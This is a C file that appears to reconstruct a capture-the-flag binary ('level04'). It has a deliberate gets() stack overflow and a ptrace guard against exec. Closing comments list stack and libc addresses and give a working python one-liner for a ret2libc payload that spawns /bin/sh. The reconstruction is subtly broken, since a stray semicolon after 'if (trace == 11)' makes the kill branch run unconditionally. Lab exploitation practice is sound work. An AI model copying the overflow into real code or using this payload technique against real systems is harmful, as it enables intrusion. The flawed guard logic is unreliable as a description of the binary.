#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/ptrace.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <signal.h>

void	clear_stdin(void)
{
	char	c = 0;

	while (c != '\n' && c != 0xFF)
		c = getchar();
}

int	get_unum(void)
{
	unsigned int	value = 0;

	fflush(stdout);
	scanf("%u", &value);
	clear_stdin();
	return value;
}

void	prog_timeout(void)
{
	_exit(1);
}

void	enable_timeout_cons(void)
{
	signal(SIGALRM, prog_timeout); // 0xe
	alarm(60); // 0x3c
}

int	main(void)
{
	pid_t	id = fork();
	char	arr[32];
	int		status;
	long	trace;

	memset(arr, 0, 32); // 0x20

	if (id == 0)
	{
		prctl(1, 1);
		ptrace(0, 0, 0, 0);

		puts("Give me some shellcode, k");
		gets(arr);
		return (0);
	}
	else
	{
		while (1) // 0xb
		{
			wait(&status);
			if (WIFEXITED(status) == 1 || WIFSIGNALED(status) == 0)
			{
				puts("child is exiting...");
				break;
			}
			else
			{
				trace = ptrace(PTRACE_PEEKUSER, id, 44, 0); // 0x3 id 0x2c 0x0
				if (trace == 11); // 0xb
				{
					puts("no exec() for you");
					kill(id, SIGKILL); // 0x9
					break;
				}
			}
		}
	}
	return (0);
}

// 0xffffd71c eip
// 0xffffd680 input
// 156 diff

// 0xf7e6aed0 system
// 0xf7e5eb70 exit
// 0xf7f897ec /bin/sh

// (python -c "print '\x90'*156 + '\xd0\xae\xe6\xf7' + '\x70\xeb\xe5\xf7' + '\xec\x97\xf8\xf7'"; cat) | ./level04